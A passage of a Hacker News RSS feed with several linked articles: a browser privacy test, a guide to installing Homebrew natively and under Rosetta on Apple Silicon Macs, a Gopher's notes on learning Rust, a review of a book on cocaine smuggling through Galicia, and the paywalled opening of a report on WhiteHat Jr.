https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-50x22.png 50w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-300x131.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-50x22.png 50w"><figcaption>Snap Search Passed</figcaption></figure><ul><li>No separate incognito mode</li><li>No ‘burn’/’clear’ button</li><li>Did not use VPN mode</li></ul><p>Simply opened a new tab, and it worked. No fancy tricks – plain old respecting your privacy. You can even see both the tabs simultaneously open in the last screen. While the <em>others failed</em> after numerous restarts, incognito modes and clearing history, <strong>Snap Search simply worked.</strong></p><h2>Conclusion</h2><p>This small test does not mean the others are bad – one simple test can’t prove anything. Each of them have their own advantages and there’s a lot to  consider when you pick a browser.</p><p>However, the fact that none of them worked is a little concerning. The fact that Snap Search worked so easily is something really worth thinking about when you make the choice of which browser to use.</p><p>What do you think? <a href="https://snapsearch.online/android" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">Give us a try</a>?</p></div></div></div>]]>
            </description>
            <link>https://snapsearch.online/tips/androids-best-private-browsers-privacy-test/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25134194</guid>
            <pubDate>Wed, 18 Nov 2020 07:56:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Homebrew on Apple Silicon]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25134188">thread link</a>) | @ingve
<br/>
November 17, 2020 | https://soffes.blog/homebrew-on-apple-silicon | <a href="https://web.archive.org/web/*/https://soffes.blog/homebrew-on-apple-silicon">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <header>
      <h2><a href="https://soffes.blog/homebrew-on-apple-silicon">Homebrew on Apple Silicon</a></h2>
      <p>Posted on <time datetime="2020-11-17T00:00:00Z">November 17, 2020</time></p>
    </header>
    <p>Today, my new 13-inch MacBook Pro arrived! I was super excited to get it out of the box and set it up. This thing is fast! I am already very impressed. When I started setting up my development environment, things started to get a little frustrating. Have no fear, it’s solvable!</p>

<p>The biggest issue for me was <a href="https://brew.sh/" target="_blank" rel="noopener">Homebrew</a>. According to <a href="https://github.com/Homebrew/brew/issues/7857" target="_blank" rel="noopener">this issue</a> “There won’t be any support for native ARM Homebrew installations for months to come.” No big deal though. <mark>Homebrew can work just fine with Rosetta 2</mark> and some things work natively.</p>

<h2>Using Rosetta 2</h2>

<p>Rosetta 2 is Apple’s translation later. This lets you run Intel things with a little overhead. In Terminal, you can run any process with Rosetta by prefixing it with <code>arch -x86_64</code>.</p>

<p>To get Homebrew working, let’s install it using Rosetta:</p>
<pre>$ arch -x86_64 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"
</pre>
<p>This command is the standard installer from <a href="https://brew.sh/" target="_blank" rel="noopener">brew.sh</a> with the Rosetta prefix. This will setup Homebrew in <code>/usr/local</code>. Now whenever you want to interact with it, you can run <code>arch -x86_64 brew …</code>. Easy enough!</p>

<p>If you want to wait for official support for Apple Silicon, feel free to stop reading here.</p>

<h2>Multiple Homebrews</h2>

<p>Homebrew does sorta work on Apple Silicon. See <a href="https://github.com/Homebrew/brew/issues/7857" target="_blank" rel="noopener">this issue</a> for the current status. OpenJDK and Go don’t work as of this writing and that blocks a lot of things. I was able to get Postgres, Redis, ImageMagick, rbenv, etc. all working natively though! To do this, you’ll need a second Homebrew.</p>

<p>Homebrew for Apple Silicon is expected to be installed in <code>/opt/homebrew</code> instead of the <code>/usr/local</code> you’re expecting. Let’s get that set up:</p>
<pre>$ sudo mkdir -p /opt/homebrew
$ sudo chown -R $(whoami):staff /opt/homebrew
$ cd /opt
$ curl -L https://github.com/Homebrew/brew/tarball/master | tar xz --strip 1 -C homebrew
</pre>
<p>This creates a new directory, setups the right permissions, and downloads Homebrew.</p>

<p>Be sure to add <code>/opt/homebrew/bin</code> to your <code>$PATH</code>!</p>

<p>Whichever <code>brew</code> is in your path first will run when you use <code>brew</code>. If it’s the <code>/usr/local</code> one, you’ll need to add the <code>arch -x86_64</code> prefix every time. Your best bet for using both is to alias one of them.</p>

<p>I made sure <code>/opt/homebrew/bin</code> was in my path <strong>before</strong> <code>/usr/local/bin</code>. Then I aliased the Intel <code>brew</code> to <code>ibrew</code> so it’s easier to select. Here’s what I added to my ZSH configuration:</p>
<pre>export PATH="/opt/homebrew/bin:/usr/local/bin:$PATH"
alias ibrew='arch -x86_64 /usr/local/bin/brew'
</pre>
<p>Now you can easily run <code>brew</code> to get the native one or <code>ibrew</code> to get the Rosetta one. You could of course do this in the other order in your <code>$PATH</code> if you prefer and something like <code>abrew</code> (for Apple Silicon Homebrew) or whatever else.</p>

<p>If you install things in both Homebrews, the one that is first in your path will be used.</p>

<hr>

<p><strong>Disclaimer:</strong> This is as of 2020-11-17. Things are surely going to change. Follow along in <a href="https://github.com/Homebrew/brew/issues/7857" target="_blank" rel="noopener">this issue</a> for the latest from the Homebrew team.</p>

<p><strong>Update 2020-11-18:</strong> I realized both at the same time wasn’t working as I described. Updated the multi section.</p>

    
  </article></div>]]>
            </description>
            <link>https://soffes.blog/homebrew-on-apple-silicon</link>
            <guid isPermaLink="false">hacker-news-small-sites-25134188</guid>
            <pubDate>Wed, 18 Nov 2020 07:55:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust from a Gopher – Lessons 7, 8 and 9]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 57 (<a href="https://news.ycombinator.com/item?id=25133921">thread link</a>) | @BookPage
<br/>
November 17, 2020 | https://levpaul.com/posts/rust-lesson-7-8-9/ | <a href="https://web.archive.org/web/*/https://levpaul.com/posts/rust-lesson-7-8-9/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Hello and welcome to the fifth post in my series about learning Rust. In case you want to hit it from the start, <a href="https://levpaul.com/posts/rust-lesson-1/">here’s</a> a link to the first one! This entire series covers my journey from being a completely land-locked Gopher to becoming (hopefully) a hardened Rustacean, able to skitter the hazardous seabed of any application safely.</p><hr><p>I can’t believe we’re at post number five! It’s been a wonderful ride, and I’ve been blown away by the helpful feedback from the Rust community at large. Thank you to everyone for all of the warm help.</p><p>Whilst I’m still in my infancy with Rust, it’s getting harder and harder to hold the itch to learn more. Often I want nothing more than to open the Rust Book and truck on with learning, blog posts be darned! However, I’ve made my commitment to myself, you and the Book, so every night; write, I do.</p><p>I’ve decided to make this post a <em>triple</em>, so let’s begin where we left off!</p><h3 id="7-packages-and-crates-and-stuffhttpsdocrust-langorgbookch07-00-managing-growing-projects-with-packages-crates-and-moduleshtmlmanaging-growing-projects-with-packages-crates-and-modules">7. <a href="https://doc.rust-lang.org/book/ch07-00-managing-growing-projects-with-packages-crates-and-modules.html#managing-growing-projects-with-packages-crates-and-modules">Packages and Crates and Stuff</a></h3><p>Right off the bat, I think this chapter is very well-placed. Even though it took me the entire chapter <em>grok</em> crates, modules and packages; I don’t think it came a line too early or late. Bravo! The chapter introduced many new keywords, such as <code>use</code>, <code>pub</code>, <code>mod</code>, <code>super</code>, but you walk away feeling like you can actually use them properly.</p><h4 id="modules">Modules</h4><p>Modules are introduced leaning heavily on the analogy of a file system… Now given that modules, at the most granular level, can be defined as single files <em>with the module name</em>, I’m actually wondering how much of this <em>is an analogy</em> and how much of it is really what’s happening at the compiler level. I would grin so hard if the bit about <strong><code>use</code></strong> being <em>like</em> a symlink <em>was</em> actually just a thing that was happening somewhere in the build chain. I’m sure it’s not though… Right.</p><h4 id="privacy">Privacy</h4><p>I enjoyed how the authors talked about privacy through scope. It helped me link project structure ideas with programming rules. For some reason I always thought of privacy as logical rules applied to code after the fact, rather than just having or not having something within a certain scope. It’s a lot easier to think about the later way. All this being said, there was also an overarching “Restaurant” example which they tried to tie in with privacy - check this gem:</p><blockquote><p>The way privacy works in Rust is that all items (functions, methods, structs, enums, modules, and constants) are private by default. […] To continue with the restaurant metaphor, think of the privacy rules as being like the back office of a restaurant: what goes on in there is private to restaurant customers, but office managers can see and do everything in the restaurant in which they operate.</p></blockquote><p>… I think that metaphor died somewhere in the rafters above the restaurant, and the smell could be starting to affect the food. Sorry.</p><p>For those who don’t know, privacy in Go is defined by whether you capitalize the first letter of your func/struct/interface name. Whilst lean and consistent - I much prefer the Rust approach. Rust is private by default unless you plop a <code>pub</code> in front of it. The main irk I have with the Go way is that Go’s naming convention also tells you acronyms should be entirely uppercase. So what happens when you want a private struct called <code>jsonData</code>? Well you have to think of something else because calling it <code>JSONData</code> will make it publicly exported and <code>jsonData</code> is not idiomatic. It’s definitely but only a nit, however I’ve become (unreasonably?) irked by it on more than one occasion.</p><h5 id="clean-your-room">Clean your room!</h5><p>The lesson proved once again that the Rust compiler is helpful. Gentle warnings about my variables being unused really makes me feel cared for. Go isn’t like this. Go grabs you by your collar and pierces your eardrums with a shrewd screech. It won’t let you go either. Like a harpy, the tiny chipmunk won’t let up. Thank Crabby for small mercies is all I can say.</p><p>On a more serious note though, I like this choice by Rust - my preference for most things I’d code would be to enforce compiler errors for unused variables; but it should be a compiler option; which as far as I know - it is <strong>not</strong>, in Go. I’m going to guess you should be able to upgrade the Rust warnings to errors through compiler flags somehow.</p><h5 id="re-exporting-imports">Re-exporting Imports</h5><p>This <a href="https://doc.rust-lang.org/book/ch07-04-bringing-paths-into-scope-with-the-use-keyword.html#re-exporting-names-with-pub-use">feature</a> of Rust gives me mixed feelings. As I understand it, when you <code>use</code> a package, that package can then bring more packages into your scope? I mean it does make sense from a library user-experience perspective, but I can’t help but feel like there’s a bit of trust going on here, if not only taste-trust. It’s definitely nice to just <code>use</code> a crate once and have everything you need to interact with it.</p><p>There’s only one Rust project I’m really interested in right now - a Game engine and editor called <a href="https://github.com/mrDIMAS/rg3d">rg3d</a>. I checked that project’s source for re-exports and found some in the top level <a href="https://github.com/mrDIMAS/rg3d/blob/master/src/lib.rs"><code>lib.rs</code></a>. Basically it just imports its own submodules publicly. I have no idea if this is idiomatic but to my lay-eyes this use-case looks correct and just.</p><p>Rust has been giving me a strong Java vibe from its imports. The nested paths feature seems good - ugly but succinct. Maybe my editor or <code>rustfmt</code> will automatically manage this for me? I enjoy not needing to worry about imports 99% of the time in Go, thanks to <code>goimports</code>, so hopefully that trend will continue in Rust.</p><h5 id="prelude-to-nothing">Prelude to Nothing</h5><p>In previous posts I mentioned being wooed by wistful mentions of a <code>prelude</code> by the Book. Well this chapter mentioned it again, and more than wistfully. It drowned my unquenchable satiety with <a href="https://doc.rust-lang.org/std/prelude/index.html">this link</a>, which to my utmost sorrow, was not a chapter in the Book. Alas, I read it in spite the fact. Oh, but my heart was flattened like my toddler’s playdough on a Sunday morning, for I was to find <strong>the prelude</strong> means nothing more than the default set of imports for a program. Through the sobriety of hindsight, I do question what else I was expecting. Given Rust doesn’t have a runtime, it doesn’t need anything fancy. Oh well, at least the great prelude mystery is solved.</p><h3 id="8-common-collectionshttpsdocrust-langorgbookch08-00-common-collectionshtml"><a href="https://doc.rust-lang.org/book/ch08-00-common-collections.html">8. Common Collections</a></h3><p>I just want to take a moment to swoon over Rust’s type inference again.</p><p>*<em><strong>swoons</strong></em>*</p><p>It’s fantastic. This is all…</p><hr><p>Now for actual chapter 8; it’s fairly dense. Covered is a brief introduction of standard library’s collections, Vectors, HashMaps and finally a deep dive into Rust Strings. Let’s begin the blow-by-blow starting with this gem:</p><div><pre><code data-lang="rust"><span>fn</span> <span>main</span><span>()</span><span> </span><span>{</span><span>
</span><span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>v</span><span> </span><span>=</span><span> </span><span>vec</span><span>!</span><span>[</span><span>1</span><span>,</span><span> </span><span>2</span><span>,</span><span> </span><span>3</span><span>,</span><span> </span><span>4</span><span>,</span><span> </span><span>5</span><span>];</span><span>
</span><span>    </span><span>let</span><span> </span><span>first</span><span> </span><span>=</span><span> </span><span>&amp;</span><span>v</span><span>[</span><span>0</span><span>];</span><span>
</span><span>    </span><span>v</span><span>.</span><span>push</span><span>(</span><span>6</span><span>);</span><span>
</span><span>    </span><span>println</span><span>!</span><span>(</span><span>"The first element is: {}"</span><span>,</span><span> </span><span>first</span><span>);</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><p>Guess what won’t compile? Correct - the code above! What’s happening here is that <code>v</code> is mutable and <code>first</code> is immutable. If <code>v</code> needs to grow from something like a push; then this may end up moving the entire heap-allocated vector into another part of the heap. Had this to happen, then <code>first</code> would be a “dangling” ref to what <em>used</em> to be the first element of <code>v</code>.</p><p>Now what really tickles me is wondering about how that enforcement is encoded - what is <code>first</code> a reference to exactly? The Vec? No, my IDE tells me it’s an <code>&amp;i32</code> ref… But, somehow the compiler knows that <em>THAT</em> i32 ref is a child, or related to the Vec in the same scope. I
’d love to know more about how this works.</p><p>Perhaps not by major coincidence the Book offers up possibly the most perfect lead for such questions only paragraphs later… The Book introduces the <a href="https://doc.rust-lang.org/nomicon/vec.html">Rustinomicon</a>, telling us that we can peer into it to see details about how <code>vec</code> is made… At first, I was a little tense. Why does this reference-style-looking book have the Lovecraftian name? Only when I glimpsed the first line of its opening, did the ink droplets align:</p><h3 id="the-dark-arts-of-unsafe-rust"><code>The Dark Arts of Unsafe Rust</code></h3><p>…<em>followed by</em></p><p>THE KNOWLEDGE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF UNLEASHING INDESCRIBABLE HORRORS THAT SHATTER YOUR PSYCHE AND SET YOUR MIND ADRIFT IN THE UNKNOWABLY INFINITE COSMOS.</p><h4 id="okay-this-looks-awesome"><strong>OKAY THIS LOOKS AWESOME</strong>.</h4><p>Flipping back to the <code>vec</code> chapter of the Rustinomicon, I realised it’s not at all a boring appendix style libdoc for vectors - the god damn tomb is teaching you to write your <em>OWN</em> std::Vec from scratch!</p><p>Good God, this is made me bite my lip in awkward nuclear attraction. I had some plans in mind for what I wanted to write about after this series. Right now the thought of doing a mini-series through the nomcon is sounding mighty fine though.. <em>More to come on this later</em>, as I managed to pry myself away and back to the lesson at hand.</p><hr><p>Looking through the method list (by god the <a href="https://doc.rust-lang.org/std/vec/struct.Vec.html">doc pages</a> are ugly; hint - only use the sidebar to navigate, do not bother free-scrolling), <code>vec</code> REALLY has some cool funcs. <code>dedup</code>, <code>drain</code>, <code>retain</code> all look to do what you’d expect. I jaunted quickly through <a href="https://doc.rust-lang.org/std/iter/trait.Iterator.html"><code>std::iter:Iterator</code></a> too and found SO many nice to haves, such as <code>gt</code>, <code>is_sorted</code>, <code>map</code>, <code>fold</code>, <code>filter</code>…</p><p>Seriously, I know there’s a lot you wouldn’t need here - but I really do wish we had simple collections/traits outside of slices and maps in Go. And yes, before I get screamed at - <em>I know</em> you can write your own in <a href="https://gobyexample.com/collection-functions">a few lines</a>, but it’s not the same - especially when you start involving complex data types. Being able to just conform to standard interfaces for elegance is something I adore and miss.</p><h4 id="string-theory">String Theory</h4><p>The chapter devotes a large swath to Strings and UTF-8. At first, I thought “how boring”, but then I realised I am the boring one! This is a much more interesting problem than I gave credit for and it made me go back to Go to better understand the “rune” system it uses for strings.</p><p>First, strings; there’s actually shit-loads of them in Rust… <code>OsString</code>, <code>CString</code>, <code>CStr</code>, <code>OsStr</code>… How wrong I was to assume a single String type in Rust indeed.</p><p>The stdlib provides many helpful functions over regular <code>String</code>. In Go, string is a part of <code>builtin</code>, but you use the stdlib’s <code>strings</code> package for more helpers.</p><hr><p><strong>Random question</strong>: Is there a difference between <code>String::from("")</code> and <code>String::new()</code>? According to this test; no:</p><div><pre><code data-lang="rust"><span>    </span><span>assert_eq</span><span>!</span><span>(</span><span>true</span><span>,</span><span> </span><span>String</span>::<span>from</span><span>(</span><span>""</span><span>)</span><span> </span><span>==</span><span> </span><span>String</span>::<span>new</span><span>());</span><span>
</span></code></pre></div><p>I’ve seen both methods being used so far and am not sure which one is “better”/idiomatic.</p><h4 id="indexing-into-strings">Indexing into Strings</h4><blockquote><p>A final reason …</p></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://levpaul.com/posts/rust-lesson-7-8-9/">https://levpaul.com/posts/rust-lesson-7-8-9/</a></em></p>]]>
            </description>
            <link>https://levpaul.com/posts/rust-lesson-7-8-9/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25133921</guid>
            <pubDate>Wed, 18 Nov 2020 06:58:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Snow on The Atlantic: How Cocaine Came to Europe]]>
            </title>
            <description>
<![CDATA[
Score 41 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25133549">thread link</a>) | @AndrewBissell
<br/>
November 17, 2020 | https://www.ebb-magazine.com/essays/snow-on-the-atlantic | <a href="https://web.archive.org/web/*/https://www.ebb-magazine.com/essays/snow-on-the-atlantic">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-00c327a0e80805b65a15"><div><p>At the beginning of Alfred W. McCoy’s seminal work on the global heroin trade and the CIA, <em>The Politics of Heroin</em>, he gives us a simple formulation that’s useful for any study of illicit drugs and their trade: ‘Narcotics are not simply illegal and immoral,’ he writes. ‘They are the source of extraordinary profits and power.’ Part of the power of McCoy’s book is that he writes about his subject so thoughtfully, and eschews the sensationalism that characterizes too much writing about drugs and their traffic. ‘Simply put, narcotics are major global commodities that resist any attempt at localized suppression… As long as demand for drugs in the cities of the First World continues to grow, Third World producers will find a way to supply their markets.’</p><p>Nacho Carretero’s <em>Snow on The Atlantic, How Cocaine Came to Europe</em>, published in a translation by Thomas Bunstead in 2018 by Zed Books, is a contribution to telling the story of one of these global commodities: cocaine. It tells a tale of Galicia and its Costa Del Morte, that region in Spain sitting on top of Portugal with 930 deadly miles of coastline and an adventurous history of shipwrecks and pirates and smuggling. This book focuses on the colorful tale of how Galicia became the port for cocaine smuggling in Europe, largely through an alliance between the Medellín Cartel in Colombia and a homegrown smuggling culture and network of clans. It’s packed with characters and schemes and police operations, but one flaw is that it falls into their sensationalism too often (a <a href="https://www.antena3.com/series/farina/">popular television series</a> in Spain was based on the book), and its major failing is in not making much of an attempt to analyze the phenomenon more deeply. The details in the book, however, make great raw material for a more developed analysis down the line.</p><p>Here is a sketch of the story that Carretero tells: it begins in earnest after the Spanish Civil War, in that inter-border region between Spain and Portugal called the <em>Couto Mixto</em>. Carretero goes as far as to say the area is characterized by a ‘statelessness.’ Not so long ago, as recently as the nineteenth century, if you asked villagers in the area what country they were citizens of they couldn’t tell you. The Spanish Civil War defined these borders. And those borders made nations become as classes; the living standard in Portugal was high, while in Spanish Galicia much of the rural inhabitants lived in relative and real poverty. It was the difference, Carretero writes, ‘between one group of people who were starving, and another enjoying the spoils of African colonies.’ This was something I wish Carretero had expanded on: what was the licit economy in Galicia and why did its people live worse? On that he gives no real answer, though he does describe how some local fortunes were made from tungsten sold to the Third Reich during the Second World War.</p><p>Whatever the reasons for this poverty, the relative affluence of Portugal right across the border made Galicia a prime location for smuggling of all sorts of things. It was cigarettes which became the big money maker. Smugglers cut deals with the big guys like Reynolds &amp; Philip Morris in America to move excess production and faulty batches, dodging gargantuan amounts of taxes, and altering the flow of goods from up from Portugal to across the Atlantic. That route would define the traffic later when cocaine started coming from Colombia.&nbsp;</p><p>The law helped too. Until 1982 all you could get for smuggling was a caution. Before 1978 smuggling was only an economic offence. With the Customs Surveillance Service (SVA) enforcing the weak laws, smugglers rarely went to jail – at most they’d get a fine, and that would often be lost in the Minoan bureaucratic system of the new democratic state post-Franco.</p><p>Carretero describes a society where the lumpen ruled each class strata, not just a lumpen-proletariat but a lumpen-petty bourgeois and a lumpen bourgeoisie. ‘There was nothing abnormal about the sight of smugglers and <em>guardias</em> sharing a tumbler of wine over a game of dominos in the local tavern.’ He explains further that smugglers and police would often have agreements that let the smuggling pass unmolested, provided the police got their cut: ‘From the beginning, the relationship with the <em>Guardia Civil </em>was good. Those in the pay of the government were as hard up as everyone else, and it was almost always them who proposed the pacts.’</p><p>Police in on the take isn’t unprecedented or uncommon. More interesting are the connections Carretero details between the smugglers and the political class. When I mention smugglers, I’m referring not just to the later drug traffickers but also the ‘smoke lords’ who developed their expertise and reputation moving cigarettes. They provided the perfect resource for the cartels to exploit later when they saw the talent and culture that existed in Galicia. These mafia-like clans were generous contributors to all political parties in the region, particularly the institutional right-wing parties like the <em>People’s Alliance</em> (AP), which later became the <em>Partido Popular</em> (PP). That party had numerous links to the smugglers, from campaign contributions to friendships, to particularly salient connections through the Galician Chamber of Commerce, of which many smugglers and their associates were members at one time or another. That extended to the auxiliaries of the narcotics trade – lawyers like Pablo Vioque who defended the smugglers in their inevitable run-ins with the law.</p><div><p>How the shift to drug smuggling was made is murky. Someone bought hashish once from Africa and knew one of the <em>Capos</em>. Hashish smuggling quickly became cocaine.</p><p> However it happened, smugglers made the transition quickly. When the Medellín cartel spent some time in Galicia in exile they realized that there was an ideal infrastructure for them to use. They built this trade from the ready-made scaffolding of the tobacco trade. Clan bosses like Sito Miñanco took the speedboats they had running crates of smoke up and down the Arousa river and loaded them with blow.&nbsp;</p></div><p>The Medellín cartel had come to Galica because they were feeling some heat from the DEA in bringing drugs into the U.S. (never if it went at cross measures with the goals of the CIA, of course, as McCoy shows in his book), and they needed new markets. McCoy’s law of narcotics as commodities seeking to be sold held true. Europe in the 80s was the perfect logical next step. Not only did they have the skilled talent they needed, but the Galicians spoke their language. And the government tied its own hands to stop it thanks to their numerous corrupt connections.</p><p>This is the more interesting story that I wish the book had told, as well as delving deeper into the politics of the trade. Why did Galician politicians allow the smuggling culture to take hold? Carretero mentions that a factor in the government finally taking action was the support for interdiction of the trade by Socialist Party (PSOE) politicians, like Felipe González, who was Prime Minister of the country from 1982-1996. It was within this time period that the first blow against the smugglers came, with the ‘macro-indictment’ of 1984. This was the first coordinated strike against the whole of the smugglers and their network, rather than limited and ineffective isolated enforcement. Carretero credits the limited success of this action (nobody went down hard, though it did create a new state of affairs where the smugglers had to tread more cautiously and not so out in the open as they had before) to it having the support of a Virginio Fuentes. Fuentes was the socialist governor of Pontevedra, ‘one of the few in Galician politics to raise his voice against the smugglers.’ Carretero attributes this to Fuentes following the cue of González; he ‘sensed a potential vote-winner in taking a stand against smuggling.’</p><p>But Carretero also mentions a murkier story that would have merited closer scrutiny (or more realistically its own book). He relates an anecdote from Fernando Rodríguez Mondragón’s book <em>El hijo del ‘Ajedrecista’ </em>(The ‘Chess Player's’ Son). That chess player was Gilberto Rodríguez Orejuela, who was the boss of the Cali cartel – the cartel that shipped the cocaine over the Atlantic to Galicia. Orejuela was in Spain following a crackdown in Colombia by the President Belisario Betancur on the narcos, but he had been scooped up in November of ‘84 in Spain along with an account book of his detailing millions of dollars in transactions for the cartel. The DEA wanted Orejuela extradited to America, but after two years of jockeying and negotiation, Orejuela and the Colombians were sent back to Colombia. They spent just months in prison before getting out, while in America they could have expected 10-15-year prison sentences.</p><p>Mondragón says in his book that the reason for these reduced sentences came to Spain on Pablo Escobar’s private jet. And there were twenty million of these reasons. $5 million went to Felipe González, ‘his negotiators said there was an election coming up and they needed the money.’ $10 million went to the <em>Audiencia Nacional</em>, ‘the High Court in Spain with jurisdiction over international crimes.’ Carretero doesn’t dig any deeper into these explosive allegations, wrapping up tersely that ‘these claims remain unsubstantiated.’ But having questions like these answered would go a long way in understanding how exactly the drug trade was tolerated by the Spanish government.&nbsp;</p><p>McCoy notes that ‘the CIA’s Cold War alliances with drug lords ... created enforcement-free zones closed to outside investigation.’ How this worked was simple, ‘the DEA deferred to the CIA during the Cold War whenever covert operations became intertwined in the drug trade…’ Its links to the Medellín cartel, which Pablo Escobar founded, are documented as well. ‘All major U.S. agencies,’ writes McCoy, ‘have gone on the record stating, with varying degrees of frankness, that the Medellín cartel used contra forces to smuggle cocaine into the …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ebb-magazine.com/essays/snow-on-the-atlantic">https://www.ebb-magazine.com/essays/snow-on-the-atlantic</a></em></p>]]>
            </description>
            <link>https://www.ebb-magazine.com/essays/snow-on-the-atlantic</link>
            <guid isPermaLink="false">hacker-news-small-sites-25133549</guid>
            <pubDate>Wed, 18 Nov 2020 05:32:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[India’s WhiteHat Jr is startup hell]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25133421">thread link</a>) | @_pythonlover_
<br/>
November 17, 2020 | https://themorningcontext.com/indias-whitehatjr-is-startup-hell/ | <a href="https://web.archive.org/web/*/https://themorningcontext.com/indias-whitehatjr-is-startup-hell/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
	<div id="primary">
		<main id="main">

		
<article id="post-83914">
	<!-- .entry-header -->

			
			<p><img width="640" height="480" src="https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-1440x1080.jpg" alt="WhiteHat Jr" srcset="https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-1440x1080.jpg 1440w, https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-1024x768.jpg 1024w, https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-400x300.jpg 400w, https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-768x576.jpg 768w, https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-1536x1152.jpg 1536w, https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-2048x1536.jpg 2048w, https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-600x450.jpg 600w" sizes="(max-width: 640px) 100vw, 640px">			</p><!-- .post-thumbnail -->

							<!-- <div class="blog-feaured-img" style="background-image: url('');"></div> -->
		
		<div>
								<div>
						
<p>Shaarif Ansari got the call on 11 November at around 9 in the morning. On the phone was a police officer from Powai police station, in the suburbs of Mumbai. “Ansari please come to the police station,” said the officer. “We have received a complaint from your employer WhiteHat Jr. The company officials are here at the station already. We are waiting for you.”&nbsp;</p>


<p>Ansari was taken aback. It is not everyday that you have a police officer call you. Almost immediately he clarified that he did not work at WhiteHat Jr anymore. That he was fired by the company in the first week of September and had had no contact with them since, so what was all this about? The person was in no mood to explain or chat. He cut Ansari off, and asked him to turn up at the station immediately. Caught completely by surprise and with no idea about what was in store for him, Ansari said he was on his way.</p>

						<div>
							<div>
								<p>
									You can read this story by signing up for a <span><a href="https://themorningcontext.com/indias-whitehatjr-is-startup-hell/">free account</a></span>.  or <a href="https://themorningcontext.com/indias-whitehatjr-is-startup-hell/">log in</a> if you are already a member.
								</p>
							</div>
						</div>
					</div>
				
		
					</div><!-- .entry-content -->

					
				
				<div>
